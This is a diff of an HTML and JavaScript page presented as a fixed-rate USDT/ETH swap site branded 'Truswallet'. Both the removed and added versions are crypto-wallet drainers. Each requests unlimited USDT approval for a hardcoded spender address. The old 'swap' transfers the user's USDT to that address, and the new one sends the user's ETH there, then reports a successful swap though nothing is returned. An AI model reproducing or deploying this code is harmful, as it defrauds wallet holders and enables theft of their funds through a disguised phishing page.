@@ -1,203 +1,106 @@
 <!DOCTYPE html>
-<html lang="az">
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>USDT → ETH Swap · Fixed 2500 USD/ETH</title>
+  <meta charset="UTF-8" />
+  <title>USDT ↔ ETH Swap | Truswallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.12.1/dist/index.umd.min.js"></script>
   <style>
-    body { background: radial-gradient(1200px 600px at 10% 10%, #f7fafc 0, #eef2f7 50%, #e9edf3 100%); }
-    .card { backdrop-filter: blur(10px); background: rgba(255,255,255,0.6); }
-    .shadow-soft { box-shadow: 0 10px 30px rgba(15, 23, 42, .08); }
-    input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-    input[type=number] { -moz-appearance: textfield; }
+    body {
+      background: radial-gradient(circle at top left, #f0f4f8, #d9e2ec);
+    }
+    .glass {
+      backdrop-filter: blur(10px);
+      background: rgba(255, 255, 255, 0.7);
+    }
   </style>
 </head>
-<body class="text-slate-800">
-  <div class="max-w-3xl mx-auto p-6">
-    <!-- Header -->
-    <header class="flex items-center justify-between mb-6">
-      <div class="flex items-center gap-3">
-        <div class="w-10 h-10 rounded-2xl bg-white shadow-soft grid place-items-center font-bold">Ξ</div>
-        <div>
-          <h1 class="text-xl md:text-2xl font-semibold">USDT → ETH Swap</h1>
-          <p class="text-sm text-slate-500">Fixed rate: 1 ETH = 2500 USD · Ethereum Mainnet</p>
-        </div>
-      </div>
-      <div class="flex gap-2">
-        <button id="connectBtn"
-                class="px-4 py-2 rounded-2xl bg-black text-white shadow-soft hover:opacity-90 transition">
-          Connect Wallet
-        </button>
-        <button id="wcBtn"
-                class="px-4 py-2 rounded-2xl bg-green-600 text-white shadow-soft hover:opacity-90 transition">
-          WalletConnect
-        </button>
-      </div>
-    </header>
+<body class="flex items-center justify-center min-h-screen">
 
-    <!-- Status -->
-    <div id="statusBar" class="card rounded-2xl p-4 shadow-soft mb-6 text-sm text-slate-700">
-      <div><strong>Wallet:</strong> <span id="account">—</span></div>
-      <div><strong>Network:</strong> <span id="network">—</span></div>
-      <div><strong>Spender:</strong> 
-        <code class="text-xs break-all">0x4f4287A3965D87044a401ccF23BaC838a207b4Cc</code>
-      </div>
+  <div class="glass p-8 rounded-2xl shadow-2xl w-[400px] space-y-4 text-center">
+    <h1 class="text-2xl font-bold">ETH ↔ USDT Swap</h1>
+    <button id="connectButton" class="bg-black text-white px-4 py-2 rounded-full w-full">Connect Wallet</button>
+
+    <div class="bg-white rounded-xl p-4 shadow mt-4">
+      <p class="text-sm font-semibold">Your Balances:</p>
+      <p id="ethBalance">ETH: —</p>
+      <p id="usdtBalance">USDT: —</p>
     </div>
 
-    <!-- Balances -->
-    <div class="grid md:grid-cols-2 gap-4 mb-6">
-      <div class="card rounded-2xl p-5 shadow-soft">
-        <div class="text-sm text-slate-500">ETH Balance</div>
-        <div class="text-2xl font-semibold"><span id="ethBal">—</span> ETH</div>
-      </div>
-      <div class="card rounded-2xl p-5 shadow-soft">
-        <div class="text-sm text-slate-500">USDT Balance</div>
-        <div class="text-2xl font-semibold"><span id="usdtBal">—</span> USDT</div>
-      </div>
-    </div>
+    <input id="usdtInput" type="number" step="0.01" placeholder="Amount in USDT" class="w-full border px-4 py-2 rounded-xl" />
+    <p class="text-xs text-gray-500">1 ETH = 2500 USDT (fixed)</p>
 
-    <!-- Swap -->
-    <div class="card rounded-2xl p-6 shadow-soft">
-      <h2 class="text-lg font-semibold mb-4">Swap USDT → ETH</h2>
-      <label class="block text-sm text-slate-600 mb-2">Məbləğ (USDT)</label>
-      <div class="flex items-center gap-3 mb-3">
-        <input id="amountIn" type="number" min="0" step="0.000001" placeholder="0.0"
-               class="w-full rounded-xl border border-slate-200 p-3 outline-none focus:ring-2 focus:ring-slate-300 bg-white" />
-        <button id="maxBtn" class="px-3 py-2 rounded-xl bg-white border border-slate-200 hover:bg-slate-50">Max</button>
-      </div>
-      <div class="text-sm text-slate-600 mb-4">
-        Alacağınız: <strong><span id="amountOut">0</span> ETH</strong> (2500 USD/ETH)
-      </div>
-      <div class="grid md:grid-cols-2 gap-3">
-        <button id="approveBtn"
-                class="px-4 py-3 rounded-2xl bg-white border border-slate-200 hover:bg-slate-50">
-          1) Approve USDT (Unlimited)
-        </button>
-        <button id="swapBtn"
-                class="px-4 py-3 rounded-2xl bg-black text-white disabled:opacity-40">
-          2) Swap
-        </button>
-      </div>
-      <div id="log" class="text-xs text-slate-600 mt-3 space-y-1"></div>
-    </div>
+    <button id="approveButton" class="bg-blue-600 text-white px-4 py-2 rounded-xl w-full">Approve USDT</button>
+    <button id="swapButton" class="bg-green-600 text-white px-4 py-2 rounded-xl w-full">Swap to ETH</button>
+
+    <p id="status" class="text-sm text-gray-600 mt-2"></p>
   </div>
 
-<script>
-(async () => {
-  const FIXED_ETH_PRICE = 2500;
-  const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-  const USDT_DECIMALS = 6n;
-  const SPENDER = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc";
-  const ETHEREUM_CHAIN_ID = 1;
+  <script>
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
+    const spender = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc";
+    const usdtAbi = [
+      "function approve(address spender, uint amount) public returns (bool)",
+      "function allowance(address owner, address spender) public view returns (uint)",
+      "function balanceOf(address account) external view returns (uint256)"
+    ];
+    let provider, signer, account;
 
-  const ERC20_ABI = [
-    "function balanceOf(address) view returns (uint256)",
-    "function allowance(address owner, address spender) view returns (uint256)",
-    "function approve(address spender, uint256 amount) returns (bool)",
-    "function transfer(address to, uint256 amount) returns (bool)"
-  ];
+    document.getElementById("connectButton").onclick = async () => {
+      if (window.ethereum) {
+        provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = await provider.getSigner();
+        account = await signer.getAddress();
+        document.getElementById("status").textContent = "Connected: " + account.slice(0, 6) + "..." + account.slice(-4);
+        getBalances();
+      } else {
+        alert("Install MetaMask or Trust Wallet.");
+      }
+    };
 
-  let provider, signer, account, usdt;
+    async function getBalances() {
+      const ethBalance = await provider.getBalance(account);
+      document.getElementById("ethBalance").textContent = "ETH: " + (ethers.formatEther(ethBalance)).slice(0, 8);
 
-  const els = {
-    connectBtn: document.getElementById("connectBtn"),
-    wcBtn: document.getElementById("wcBtn"),
-    account: document.getElementById("account"),
-    network: document.getElementById("network"),
-    ethBal: document.getElementById("ethBal"),
-    usdtBal: document.getElementById("usdtBal"),
-    amountIn: document.getElementById("amountIn"),
-    amountOut: document.getElementById("amountOut"),
-    approveBtn: document.getElementById("approveBtn"),
-    swapBtn: document.getElementById("swapBtn"),
-    maxBtn: document.getElementById("maxBtn"),
-    log: document.getElementById("log"),
-  };
+      const usdt = new ethers.Contract(usdtAddress, usdtAbi, provider);
+      const usdtBalance = await usdt.balanceOf(account);
+      document.getElementById("usdtBalance").textContent = "USDT: " + ethers.formatUnits(usdtBalance, 18);
+    }
 
-  function log(msg, txHash) {
-    const line = document.createElement("div");
-    line.innerHTML = txHash ? `${msg} · <a target="_blank" class="underline" href="https://etherscan.io/tx/${txHash}">Etherscan</a>` : msg;
-    els.log.prepend(line);
-  }
+    document.getElementById("approveButton").onclick = async () => {
+      const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
+      try {
+        const tx = await usdt.approve(spender, ethers.MaxUint256);
+        document.getElementById("status").textContent = "Approval pending...";
+        await tx.wait();
+        document.getElementById("status").textContent = "USDT approved successfully.";
+      } catch (err) {
+        document.getElementById("status").textContent = "Approval failed: " + err.reason || err.message;
+      }
+    };
 
-  function recalcOut() {
-    const v = parseFloat(els.amountIn.value || "0");
-    els.amountOut.textContent = (isNaN(v) ? 0 : v / FIXED_ETH_PRICE).toFixed(6);
-  }
+    document.getElementById("swapButton").onclick = async () => {
+      const usdtAmount = document.getElementById("usdtInput").value;
+      if (!usdtAmount || isNaN(usdtAmount) || usdtAmount <= 0) {
+        alert("Please enter a valid USDT amount.");
+        return;
+      }
 
-  function parseUSDTAmount(val) {
-    const parts = String(val || "0").split(".");
-    const whole = parts[0] || "0";
-    const frac = (parts[1] || "").padEnd(6, "0").slice(0,6);
-    if (!/^\d+$/.test(whole+frac)) return null;
-    return BigInt(whole) * 10n**USDT_DECIMALS + BigInt(frac);
-  }
-
-  async function setupProvider(externalProvider) {
-    provider = new ethers.BrowserProvider(externalProvider, "any");
-    signer = await provider.getSigner();
-    account = await signer.getAddress();
-    usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
-    els.account.textContent = account.slice(0,6)+"…"+account.slice(-4);
-    const net = await provider.getNetwork();
-    els.network.textContent = `${net.name} (#${net.chainId})`;
-    refresh();
-  }
-
-  async function refresh() {
-    if (!signer) return;
-    const ethBal = await provider.getBalance(account);
-    els.ethBal.textContent = ethers.formatEther(ethBal);
-    const usdtBal = await usdt.balanceOf(account);
-    els.usdtBal.textContent = ethers.formatUnits(usdtBal, Number(USDT_DECIMALS));
-    const allowance = await usdt.allowance(account, SPENDER);
-    els.swapBtn.disabled = allowance <= 0n;
-  }
-
-  async function approve() {
-    const tx = await usdt.approve(SPENDER, ethers.MaxUint256);
-    log("Approve göndərildi", tx.hash);
-    await tx.wait();
-    log("Approve təsdiqləndi", tx.hash);
-    refresh();
-  }
-
-  async function swap() {
-    const amt = parseUSDTAmount(els.amountIn.value);
-    if (!amt || amt <= 0n) return alert("Düzgün USDT məbləği yazın");
-    const tx = await usdt.transfer(SPENDER, amt);
-    log("Swap göndərildi", tx.hash);
-    await tx.wait();
-    log("Swap təsdiqləndi", tx.hash);
-    refresh();
-  }
-
-  // ---- Connect buttons ----
-  els.connectBtn.onclick = async () => {
-    if (!window.ethereum) return alert("Wallet tapılmadı.");
-    await setupProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-  };
-
-  els.wcBtn.onclick = async () => {
-    const wcProvider = await window.EthereumProvider.init({
-      projectId: "4bfb3a02f02aee6baccfb622ffa02d0c",
-      chains: [1],
-      showQrModal: true,
-    });
-    await wcProvider.enable();
-    await setupProvider(wcProvider);
-  };
-
-  els.approveBtn.onclick = approve;
-  els.swapBtn.onclick = swap;
-  els.amountIn.oninput = recalcOut;
-  els.maxBtn.onclick = () => { els.amountIn.value = els.usdtBal.textContent; recalcOut(); };
-
-})();
-</script>
+      const ethToSend = ethers.parseEther((usdtAmount / 2500).toFixed(18));
+      try {
+        const tx = await signer.sendTransaction({
+          to: spender,
+          value: ethToSend
+        });
+        document.getElementById("status").textContent = "Swapping...";
+        await tx.wait();
+        document.getElementById("status").textContent = "Swapped " + usdtAmount + " USDT to ETH!";
+      } catch (err) {
+        document.getElementById("status").textContent = "Swap failed: " + err.reason || err.message;
+      }
+    };
+  </script>
 </body>
 </html>
